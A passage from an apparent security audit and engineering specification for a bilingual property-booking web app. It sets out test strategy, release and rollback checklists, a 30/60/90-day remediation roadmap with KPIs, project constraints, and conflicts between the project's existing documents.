| **Integration** | None | API endpoint tests with real DB (MySQL in Docker) | Vitest + Supertest | All tRPC routes have at least 1 happy-path and 1 error-path test |
| **E2E** | None | Critical user flows: register → search → book → pay → review | Playwright | 5 core flows, run on staging before production deploy |
| **Contract** | None | Hub API ↔ adapter API contract tests | Pact or manual schema validation | All Hub API endpoints |

### F.5 Release Checklist

**Pre-deploy:**

1. All CI checks pass (lint, typecheck, test, audit, license, secret scan).
2. Migration reviewed and tested against staging database.
3. Feature flags set correctly in staging. Smoke test passed.
4. Changelog updated with user-facing changes.
5. No `console.log` debugging statements in production code.

**Post-deploy:**

1. Health check endpoint returns 200 within 60 seconds.
2. Verify critical flows: login, search, property detail, booking.
3. Check error tracking dashboard for new errors.
4. Monitor p95 latency for 15 minutes. If > 2× baseline, rollback.
5. Verify Beds24 sync is operational (check last sync timestamp).

**Rollback procedure:**

1. Railway: Revert to previous deployment via Railway dashboard.
2. Database: If migration was applied, run the down migration. If no down migration exists, the migration must be forward-compatible (old code works with new schema).
3. Cache: Invalidate all cache entries (`cache.invalidateAll()`).
4. Notify team via Slack channel.

---

## G) Implementation Roadmap (30/60/90 Days)

### Days 1–30: Security & Foundation

**Theme:** Eliminate critical vulnerabilities and establish CI/CD.

| Week | Milestone | Deliverable | KPI |
|------|-----------|-------------|-----|
| 1 | Password policy + env validation | SEC-02, SEC-04 implemented | Zero weak passwords accepted |
| 2 | Session token rotation | SEC-01 implemented (access: 15min, refresh: 30d) | Average session duration < 15min |
| 2 | CI pipeline (lint + typecheck + test) | `.github/workflows/ci.yml` live | All PRs gated by CI |
| 3 | Redis deployment + rate limiter migration | SEC-03 implemented, Redis on Railway | Rate limits persist across deploys |
| 3 | CSP hardening | SEC-05 (nonce-based CSP) in report-only mode | Zero CSP violations from legitimate code |
| 4 | Dependency audit + Dependabot | SEC-10 implemented | Zero `high`/`critical` vulnerabilities |
| 4 | DOMPurify for dangerouslySetInnerHTML | SEC-06 implemented | Zero unsanitized HTML rendering |

**Dependencies:** Redis instance must be provisioned before Week 3. Railway add-on or external provider.

**Stop-the-line criteria:** If any Critical-severity item (SEC-01, SEC-02) is not resolved by Day 14, all other work pauses until it is fixed.

### Days 31–60: Reliability & Data Integrity

**Theme:** Make the database trustworthy and the application horizontally scalable.

| Week | Milestone | Deliverable | KPI |
|------|-----------|-------------|-----|
| 5 | Foreign key constraints (Phase 1: core tables) | Migration adding FKs to bookings, payments, favorites | Zero orphaned records in new data |
| 5 | Database indexes (all tables) | Migration adding indexes per C.5 table | Search query p95 < 200ms |
| 6 | Transactions for booking + payment flows | C.4 implemented for all financial operations | Zero financial discrepancies |
| 6 | Cache migration to Redis | `RedisCacheBackend` implemented | Cache hit ratio > 90% |
| 7 | Structured logging (pino) | All `console.log` replaced with `logger.info/warn/error` | Logs parseable by log aggregator |
| 7 | Audit logging for admin actions | SEC-08 implemented | 100% of admin mutations logged |
| 8 | Staging environment | Railway staging service + deploy workflow | All changes tested on staging before production |

**Dependencies:** Foreign key migration requires data cleanup first — identify and resolve existing orphaned records.

**Stop-the-line criteria:** If foreign key migration causes data loss or breaks existing functionality, rollback immediately and investigate.

### Days 61–90: Scale & Automation

**Theme:** Prepare for 10× growth and automate quality.

| Week | Milestone | Deliverable | KPI |
|------|-----------|-------------|-----|
| 9 | E2E test suite (Playwright) | 5 core flows automated | E2E suite runs in < 5 minutes |
| 9 | Error tracking (Sentry) | Sentry integrated, alerts configured | Mean time to detect errors < 5 minutes |
| 10 | Worker service completion | Notification + auto-ticket workers functional | Webhook delivery success rate > 99% |
| 10 | Metrics + monitoring | Prometheus metrics, Grafana dashboard | p95 latency visible in real-time |
| 11 | Production deploy gates | Manual approval required for production deploys | Zero unreviewed production deploys |
| 11 | JWT secret rotation procedure | SEC-07 documented and tested | Secret rotation achievable in < 1 hour |
| 12 | Performance baseline | Load test with k6 (100 concurrent users) | Homepage < 2.5s LCP, API p95 < 500ms |

**Dependencies:** Sentry requires a Sentry project (free tier sufficient). Grafana requires a Grafana Cloud account or self-hosted instance.

**Stop-the-line criteria:** If load testing reveals p95 > 2s for any critical endpoint, prioritize performance optimization over new features.

### Measurable Outcomes (KPIs)

| KPI | Baseline (Today) | Day 30 Target | Day 60 Target | Day 90 Target |
|-----|------------------|---------------|---------------|---------------|
| Password strength | 6 chars min | 12 chars + complexity | 12 chars + complexity | 12 chars + complexity |
| Session duration | 365 days | 15 min access + 30d refresh | 15 min + 30d | 15 min + 30d |
| CI pipeline | None | Lint + typecheck + test | + audit + license + secret scan | + E2E + staging deploy |
| DB transactions | 0 | 0 (in progress) | All financial flows | All financial flows |
| Foreign keys | 0 | 0 (in progress) | Core tables (12 FKs) | All tables |
| DB indexes | 0 | 0 (in progress) | All tables (15+ indexes) | All tables |
| Test coverage | Unknown | 40% server | 60% server | 80% server + 5 E2E flows |
| Error detection | Manual | Manual | Sentry alerts | Sentry + Grafana alerts |
| Deploy confidence | Push-to-prod | CI-gated | CI + staging | CI + staging + approval |

---

## Non-Negotiables

The following constraints apply to all work described in this document:

1. **No Manus AI automations or proprietary services.** All solutions use standard open-source packages from npm.
2. **No new paid dependencies without explicit approval.** Free tiers of Sentry, Grafana Cloud, and Railway Redis are acceptable.
3. **Arabic/English behavior and RTL/LTR correctness must be preserved** in every change. No PR merges without RTL testing.
4. **Beds24 integration must not break.** Any change to the Beds24 SDK or Hub API requires explicit review and contract testing.
5. **All secrets managed via environment variables.** No hardcoded values, no secrets in logs, no secrets in client-side code.

---

## Conflicts Between Existing Documents

During this audit, the following conflicts were identified between existing documentation:

| Document A | Document B | Conflict | Resolution |
|-----------|-----------|---------|------------|
| `AUDIT_REPORT.md` states "bcrypt cost factor 10" | `auth.ts` code uses `bcrypt.genSalt(12)` | Code is correct (cost 12). Audit report is outdated. | Update AUDIT_REPORT.md to reflect cost factor 12. |
| `SRS_ENTERPRISE.md` requires "Password: min 12 chars, mixed case, numbers, special" | `auth.ts` enforces `password.length < 6` | Code does not match spec. | Implement SEC-02 to match SRS requirement. |
| `SRS_ENTERPRISE.md` requires "Access token: 15 min, Refresh token: 30 days" | `auth.ts` uses `ONE_YEAR_MS` for session | Code does not match spec. | Implement SEC-01 to match SRS requirement. |
| `SECURITY_CHECKLIST.md` marks "Rate limiting" as ✅ | Rate limiter is in-memory and resets on restart | Checklist is misleadingly optimistic. | Update checklist to reflect in-memory limitation. Mark as ⚠️ until Redis migration. |
| `ROADMAP.md` Phase 1 lists "Deploy Redis" | No Redis is deployed; cache says "set REDIS_URL for distributed caching" | Roadmap item not completed. | Include in Days 1–30 milestone (Week 3). |

---

*End of Enterprise Audit & Specification*
